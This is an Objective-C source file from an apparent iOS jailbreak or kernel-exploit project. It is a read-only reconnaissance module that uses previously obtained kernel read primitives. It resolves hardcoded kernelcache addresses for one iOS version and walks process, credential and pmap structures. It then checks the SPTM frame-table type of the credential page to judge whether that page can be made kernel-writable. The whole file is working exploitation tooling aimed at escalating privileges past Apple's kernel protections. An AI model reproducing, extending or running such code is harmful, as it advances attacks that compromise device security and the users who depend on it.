//
//  KPMapScope.m
//  KexProofV2
//
//  R5e: read-only scope recon. No kernel writes — kread only.
//

#import "KPMapScope.h"
#import "KPLog.h"
#import "KPDump.h"

#import <string.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kutils.h"
#import "exploit/offsets.h"
#import "TaskRop/pac.h"   // off_proc_ro_pr_task / off_task_map

// ---------------------------------------------------------------------------
// Static VAs from kernelcache-18.6-iphone16 (unslid). Slide is applied at runtime.
// ---------------------------------------------------------------------------

// Page-mgmt flags (R5c/R5d)
#define STATIC_FLAG_PROMOTE_21  0xfffffff007aa258aULL   // bit0 = promote to 0x21
#define STATIC_FLAG_PAGEMGMT    0xfffffff007aa2a31ULL   // second page-mgmt flag

// kernel_pmap / kernel_map global (R5d: 116 uses in the pmap region)
#define STATIC_KERNEL_PMAP      0xfffffff00aad31c0ULL   // pmap object (or +0x1c0 of page)
#define STATIC_KERNEL_PMAP_PAGE 0xfffffff00aad3000ULL

// Object layout decoded from walker 0x80dd69c (R5d)
#define PMAP_OFF_NEXT       0x08
#define PMAP_OFF_HEAD       0x10   // list sentinel
#define PMAP_OFF_START      0x10   // node range start (same slot, node view)
#define PMAP_OFF_END        0x18   // node range end
#define PMAP_OFF_PACPTR     0x40   // PAC-signed ptr (autda discr 0x250c)
#define PMAP_OFF_NODEFLAGS  0x38
#define PMAP_OFF_NODEPA     0x40   // node: translated PA-ish
#define PMAP_OFF_TYPEBYTE   0x92   // obj+216 used as state byte in walker
#define PMAP_OFF_COUNTISH   0x70   // obj+112

// FTE
#define FTE_SIZE            16
#define FTE_OFF_TYPE        2
#define FTE_OFF_READREF     8
#define FTE_OFF_WEREF       12

// ---------------------------------------------------------------------------
// Local helpers (kpRead/kpNote are static in KPDump.m)
// ---------------------------------------------------------------------------

static void scopeNote(NSMutableString *r, NSString *line) {
    [r appendString:line];
    [r appendString:@"\n"];
    [[KPLog shared] append:line];
}

static BOOL scopeRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *r) {
    if (!gPrimitives.kreadbuf) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: KRW not live", what]);
        return NO;
    }
    if (!addr) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: null addr", what]);
        return NO;
    }
    if ((addr & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: not a kernel ptr 0x%016llx",
                      what, (unsigned long long)addr]);
        return NO;
    }
    // EL2 domain (SPTM/TXM images) panics on read — never touch.
    uint64_t sptmLo = kconstant(staticSptmBase);
    uint64_t txmLo  = kconstant(staticTxmBase);
    uint64_t slide  = kconstant(slide);
    if (sptmLo && addr >= sptmLo + slide && addr < sptmLo + slide + 0xF4000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 SPTM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    if (txmLo && addr >= txmLo + slide && addr < txmLo + slide + 0x64000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 TXM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    // Unmapped-read gate (same reason as KPDump 1.7.3): a garbage pointee
    // inside the kernel-looking range but outside the image panics the
    // physical aperture. Skip reads whose endpoints do not resolve to a PA.
    // Kernel image itself is always mapped — don't gate those.
    uint64_t kb = kconstant(base);
    BOOL inKernelImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
    if (!inKernelImage) {
        uint64_t pa0 = kvtophys(addr);
        uint64_t pa1 = kvtophys(addr + size - 1);
        if (!pa0 || !pa1) {
            scopeNote(r, [NSString stringWithFormat:
                          @"  [skip] %s: unmapped VA 0x%016llx (kvtophys=0/0x%llx) — пропуск",
                          what, (unsigned long long)addr, (unsigned long long)pa0]);
            return NO;
        }
    }
    memset(out, 0, size);
    gPrimitives.kreadbuf(addr, out, size);
    return YES;
}

static uint64_t scopeUntag(uint64_t p) {
    return kp_untag_ptr(p);
}

static uint64_t scopeSlideVA(uint64_t staticVA) {
    // staticVA is unslid; runtime = staticVA + slide
    // slide = kconstant(base) - kconstant(staticBase)
    uint64_t slide = kconstant(slide);
    if (!slide && kconstant(base) && kconstant(staticBase)) {
        slide = kconstant(base) - kconstant(staticBase);
    }
    return staticVA + slide;
}

static const char *scopeTypeName(uint8_t t) {
    switch (t) {
        case 0x00: return "GOD/init";
        case 0x0b: return "XNU_GENERIC";
        case 0x15: return "PAGE_TABLE";
        case 0x18: return "ROZONE";
        case 0x1a: return "IOFILTER";
        case 0x21: return "XNU_DEFAULT";
        case 0x37: return "T8110_DART?";
        default:   return "?";
    }
}

// ---------------------------------------------------------------------------
// The report
// ---------------------------------------------------------------------------

@implementation KPMapScope

+ (NSString *)kernelPmapScopeReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5e: kernel_pmap scope recon (READ-ONLY) ===\n"];

    if (!gPrimitives.kreadbuf) {
        scopeNote(r, @"KRW primitives not live — run the exploit first.");
        return r;
    }

    scopeNote(r, [NSString stringWithFormat:@"kernel base (runtime) = 0x%016llx",
                  (unsigned long long)kconstant(base)]);
    scopeNote(r, [NSString stringWithFormat:@"kernel slide          = 0x%016llx",
                  (unsigned long long)kconstant(slide)]);
    scopeNote(r, [NSString stringWithFormat:@"virtBase/physBase     = 0x%016llx / 0x%016llx",
                  (unsigned long long)kconstant(virtBase),
                  (unsigned long long)kconstant(physBase)]);

    // -----------------------------------------------------------------------
    // 1. Page-mgmt flags
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 1. page-mgmt flags ---\n"];

    uint64_t flag1VA = scopeSlideVA(STATIC_FLAG_PROMOTE_21);
    uint8_t flag1 = 0;
    if (scopeRead(flag1VA, &flag1, 1, "flag promote-0x21", r)) {
        scopeNote(r, [NSString stringWithFormat:
            @"  flag @ static 0x%llx (runtime 0x%016llx) = 0x%02x  bit0=%d  -> %@",
            (unsigned long long)STATIC_FLAG_PROMOTE_21,
            (unsigned long long)flag1VA, flag1, flag1 & 1,
            (flag1 & 1) ? @"PROMOTE-TO-0x21 ENABLED" : @"promote disabled (collapse to 0x0b)"]);
    }

    uint64_t flag2VA = scopeSlideVA(STATIC_FLAG_PAGEMGMT);
    uint8_t flag2 = 0;
    if (scopeRead(flag2VA, &flag2, 1, "flag pagemgmt", r)) {
        scopeNote(r, [NSString stringWithFormat:
            @"  flag @ static 0x%llx (runtime 0x%016llx) = 0x%02x  bit0=%d",
            (unsigned long long)STATIC_FLAG_PAGEMGMT,
            (unsigned long long)flag2VA, flag2, flag2 & 1]);
    }

    // -----------------------------------------------------------------------
    // 2. kernel_pmap header
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 2. kernel_pmap header ---\n"];

    uint64_t pmapVA = scopeSlideVA(STATIC_KERNEL_PMAP);
    uint64_t pmapPageVA = scopeSlideVA(STATIC_KERNEL_PMAP_PAGE);
    scopeNote(r, [NSString stringWithFormat:@"  kernel_pmap candidate @ 0x%016llx (page 0x%016llx)",
                  (unsigned long long)pmapVA, (unsigned long long)pmapPageVA]);

    uint8_t hdr[0xC0];
    if (!scopeRead(pmapVA, hdr, sizeof(hdr), "kernel_pmap header", r)) {
        return r;
    }
    scopeNote(r, [NSString stringWithFormat:
        @"  +0x00..0x1f: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
        hdr[0],hdr[1],hdr[2],hdr[3],hdr[4],hdr[5],hdr[6],hdr[7],
        hdr[8],hdr[9],hdr[10],hdr[11],hdr[12],hdr[13],hdr[14],hdr[15]]);

    uint64_t headNext = 0, headA = 0, headB = 0, pacPtr = 0;
    memcpy(&headNext, hdr + PMAP_OFF_NEXT, 8);
    memcpy(&headA,    hdr + PMAP_OFF_HEAD, 8);
    memcpy(&headB,    hdr + PMAP_OFF_END, 8);
    memcpy(&pacPtr,   hdr + PMAP_OFF_PACPTR, 8);
    uint64_t headNextU = scopeUntag(headNext);
    uint64_t headAU    = scopeUntag(headA);
    uint64_t pacPtrU   = scopeUntag(pacPtr);

    scopeNote(r, [NSString stringWithFormat:@"  +0x08 next   raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)headNext, (unsigned long long)headNextU]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x10 head   raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)headA, (unsigned long long)headAU]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x18        raw=0x%016llx",
                  (unsigned long long)headB]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x40 PAC    raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)pacPtr, (unsigned long long)pacPtrU]);

    uint8_t typeByte = hdr[PMAP_OFF_TYPEBYTE];
    scopeNote(r, [NSString stringWithFormat:@"  +0x92 state  = 0x%02x", typeByte]);

    // -----------------------------------------------------------------------
    // 3. Live self-proc → ucred + pmap (calibrated chain, KPDump routes)
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 3. self proc / ucred / live pmap ---\n"];

    uint64_t selfProc = [KPDump findSelfProcByComm:r];
    if (!selfProc) selfProc = [KPDump zoneRouteSelfProcWithLog:r];
    scopeNote(r, [NSString stringWithFormat:@"  selfProc    = 0x%016llx",
                  (unsigned long long)selfProc]);

    uint64_t procRo = 0, ucred = 0, task = 0, map = 0, livePmap = 0, ttep = 0;
    if (selfProc && scopeRead(selfProc + off_proc_p_proc_ro, &procRo, 8, "p_proc_ro", r)) {
        procRo = scopeUntag(procRo);
        scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro   = 0x%016llx",
                      (unsigned long long)procRo]);
    }
    if (procRo && scopeRead(procRo + off_proc_ro_p_ucred, &ucred, 8, "p_ucred", r)) {
        ucred = scopeUntag(ucred);
        scopeNote(r, [NSString stringWithFormat:@"  p_ucred     = 0x%016llx",
                      (unsigned long long)ucred]);
    }

    // proc_ro -> task -> map -> pmap -> ttep  (same as KPDump E11 chain)
    if (procRo && scopeRead(procRo + off_proc_ro_pr_task, &task, 8, "pr_task", r)) {
        task = scopeUntag(task);
        scopeNote(r, [NSString stringWithFormat:@"  task        = 0x%016llx", (unsigned long long)task]);
    }
    if (task && scopeRead(task + off_task_map, &map, 8, "task.map", r)) {
        map = scopeUntag(map);
        scopeNote(r, [NSString stringWithFormat:@"  map         = 0x%016llx", (unsigned long long)map]);
    }
    if (map && scopeRead(map + koffsetof(vm_map, pmap), &livePmap, 8, "vm_map.pmap", r)) {
        livePmap = scopeUntag(livePmap);
        scopeNote(r, [NSString stringWithFormat:@"  live pmap   = 0x%016llx (map+0x%x)",
                      (unsigned long long)livePmap, (unsigned)koffsetof(vm_map, pmap)]);
    }
    if (livePmap && koffsetof(pmap, ttep) && scopeRead(livePmap + koffsetof(pmap, ttep), &ttep, 8, "pmap.ttep", r)) {
        ttep = scopeUntag(ttep);
        scopeNote(r, [NSString stringWithFormat:@"  pmap.ttep   = 0x%016llx", (unsigned long long)ttep]);
    }

    uint64_t ucredPA = 0;
    if (ucred && ttep && (ttep & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
        ucredPA = vtophys(ttep, ucred);
        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx (via own pmap.ttep)",
                      (unsigned long long)ucredPA]);
    } else if (ucred && ttep) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] vtophys: ttep 0x%016llx не kernel ptr",
                      (unsigned long long)ttep]);
    } else if (ucred) {
        ucredPA = kvtophys(ucred);
        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx (kvtophys fallback)",
                      (unsigned long long)ucredPA]);
    }

    // FTE oracle (layout from sptm_retype: +0 refcount:u16, +2 type:u8, +8/+12 refs)
    if (ucredPA) {
        uint64_t tableSlot = ksymbol(libsptm_frame_table);
        uint64_t tableVA = 0;
        if (tableSlot && scopeRead(tableSlot, &tableVA, 8, "frame_table slot", r)) {
            tableVA = scopeUntag(tableVA);
        }
        if (!tableVA && tableSlot) tableVA = tableSlot;

        uint64_t pB = kconstant(physBase);
        if (tableVA && pB && ucredPA >= pB) {
            uint64_t fteVA = tableVA + ((ucredPA - pB) >> 14) * FTE_SIZE;
            scopeNote(r, [NSString stringWithFormat:@"  FTE VA      = 0x%016llx (pfn=%llu)",
                          (unsigned long long)fteVA,
                          (unsigned long long)((ucredPA - pB) >> 14)]);
            uint8_t fte[16];
            if (scopeRead(fteVA, fte, 16, "FTE entry", r)) {
                uint8_t type = fte[FTE_OFF_TYPE];
                scopeNote(r, [NSString stringWithFormat:
                    @"  FTE raw: %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x",
                    fte[0],fte[1],fte[2],fte[3],fte[4],fte[5],fte[6],fte[7],
                    fte[8],fte[9],fte[10],fte[11],fte[12],fte[13],fte[14],fte[15]]);
                uint32_t rref = 0, wref = 0;
                memcpy(&rref, fte + FTE_OFF_READREF, 4);
                memcpy(&wref, fte + FTE_OFF_WEREF, 4);
                scopeNote(r, [NSString stringWithFormat:
                    @"  FTE type=0x%02x (%s)  +8=%u  +12=%u",
                    type, scopeTypeName(type), rref, wref]);
                if (type == 0x18) {
                    scopeNote(r, @"  >> ucred page is ROZONE (0x18) as expected — hop 1 target.");
                } else if (type == 0x21) {
                    scopeNote(r, @"  >> ucred page is already XNU_DEFAULT (0x21) — kwrite-ready!");
                } else if (type == 0x0b) {
                    scopeNote(r, @"  >> ucred page is XNU_GENERIC (0x0b) — hop 1 done, hop 2 pending.");
                }
            }
            int t2 = kpFrameTypeOf(ucredPA);
            if (t2 >= 0) {
                scopeNote(r, [NSString stringWithFormat:@"  kpFrameTypeOf(PA) = 0x%02x (%s)",
                              t2, scopeTypeName((uint8_t)t2)]);
            }
        } else {
            scopeNote(r, @"  [skip] frame table not resolved / PA below physBase");
        }
    }

    // -----------------------------------------------------------------------
    // 4. vm_map_entry range walk (read-only, bounded) — XPF offsets
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 4. vm_map_entry range walk (bounded 32) ---\n"];

    uint64_t mapHdrOff = koffsetof(vm_map, hdr);
    uint64_t ePrev = koffsetof(vm_map_entry, prev);
    uint64_t eNext = koffsetof(vm_map_entry, next);
    uint64_t eStart = koffsetof(vm_map_entry, start);
    uint64_t eEnd = koffsetof(vm_map_entry, end);
    uint64_t eFlags = koffsetof(vm_map_entry, flags);
    uint64_t hFirst = koffsetof(vm_map_header, first);
    uint64_t hNentries = koffsetof(vm_map_header, nentries);

    scopeNote(r, [NSString stringWithFormat:
        @"  XPF offs: map.hdr=%u entry.prev=%u next=%u start=%u end=%u flags=%u hdr.first=%u nentries=%u",
        (unsigned)mapHdrOff, (unsigned)ePrev, (unsigned)eNext, (unsigned)eStart,
        (unsigned)eEnd, (unsigned)eFlags, (unsigned)hFirst, (unsigned)hNentries]);

    uint64_t node = 0, sentinel = 0;
    if (map && mapHdrOff) {
        uint64_t hdrVA = 0;
        if (scopeRead(map + mapHdrOff, &hdrVA, 8, "vm_map.hdr", r)) {
            hdrVA = scopeUntag(hdrVA);
            scopeNote(r, [NSString stringWithFormat:@"  vm_map.hdr = 0x%016llx", (unsigned long long)hdrVA]);
            // hdr may be embedded (offset) or a pointer. If it looks like a kernel ptr, deref;
            // otherwise treat map+hdrOff as the header itself.
            uint64_t hdrBase = (hdrVA > 0xFFFFFF0000000000ULL) ? hdrVA : (map + mapHdrOff);
            if (hdrVA <= 0xFFFFFF0000000000ULL) {
                // embedded header: reread at map+hdrOff
                hdrBase = map + mapHdrOff;
                scopeNote(r, @"  (hdr looks embedded — using map+hdrOff as header base)");
            }
            uint64_t firstRaw = 0, nent = 0;
            if (scopeRead(hdrBase + hFirst, &firstRaw, 8, "hdr.first", r)) {
                node = scopeUntag(firstRaw);
            }
            if (hNentries) {
                uint32_t n32 = 0;
                if (scopeRead(hdrBase + hNentries, &n32, 4, "hdr.nentries", r)) nent = n32;
            }
            scopeNote(r, [NSString stringWithFormat:@"  hdr.first = 0x%016llx  nentries = %llu",
                          (unsigned long long)node, (unsigned long long)nent]);
            sentinel = 0; // walk until NULL
        }
    }

    int hits = 0, covers = 0;

    scopeNote(r, [NSString stringWithFormat:@"  sentinel = 0x%016llx  start node = 0x%016llx",
                  (unsigned long long)sentinel, (unsigned long long)node]);

    for (int i = 0; i < 32; i++) {
        if (!node) {
            scopeNote(r, [NSString stringWithFormat:@"  [%d] end of list (null)", i]);
            break;
        }
        if ((node & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
            scopeNote(r, [NSString stringWithFormat:@"  [%d] bad node ptr 0x%016llx — stop",
                          i, (unsigned long long)node]);
            break;
        }
        uint8_t nb[0x40];
        if (!scopeRead(node, nb, sizeof(nb), "vm_map_entry", r)) break;

        uint64_t prev = 0, next = 0, start = 0, end = 0, flags = 0;
        memcpy(&prev,  nb + ePrev,  8);
        memcpy(&next,  nb + eNext,  8);
        memcpy(&start, nb + eStart, 8);
        memcpy(&end,   nb + eEnd,   8);
        memcpy(&flags, nb + eFlags, 8);
        uint64_t nextU = scopeUntag(next);
        uint64_t startU = scopeUntag(start);
        uint64_t endU   = scopeUntag(end);

        BOOL cov = (ucred && startU && endU && ucred >= startU && ucred < endU);
        if (cov) covers++;

        scopeNote(r, [NSString stringWithFormat:
            @"  [%d] entry 0x%016llx  range [0x%016llx .. 0x%016llx)  flags=0x%016llx%@",
            i, (unsigned long long)node,
            (unsigned long long)startU, (unsigned long long)endU,
            (unsigned long long)flags,
            cov ? @"   *** COVERS UCRED ***" : @""]);

        node = nextU;
        hits++;
    }

    scopeNote(r, [NSString stringWithFormat:@"  walked %d nodes, %d cover ucred VA 0x%016llx",
                  hits, covers, (unsigned long long)ucred]);

    // -----------------------------------------------------------------------
    // 5. Verdict
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 5. scope verdict ---\n"];
    if (covers > 0) {
        scopeNote(r, @"  V1 SCOPE HIT: a vm_map_entry range covers ucred's VA.");
        scopeNote(r, @"  A walker pass through 0x8101398 should reach call 6 on this page.");
    } else if (hits == 0) {
        scopeNote(r, @"  V1 INCONCLUSIVE: no entries walked (hdr/first unresolved or empty map).");
        scopeNote(r, @"  Next: try V2 sweep (0x8177dbc) or dump vm_map.hdr fields raw.");
    } else {
        scopeNote(r, @"  V1 MISS: walked vm_map_entries, none covers ucred VA.");
        scopeNote(r, @"  Expected — ucred lives in kernel heap, not our user vm_map.");
        scopeNote(r, @"  Next: V2 sweep on kernel_map / kernel_pmap entries, or find the");
        scopeNote(r, @"  kernel-side map that owns the kernel linear range.");
    }
    scopeNote(r, @"  (No kernel writes performed. Re-run after any exploit state change.)");

    return r;
}

@end
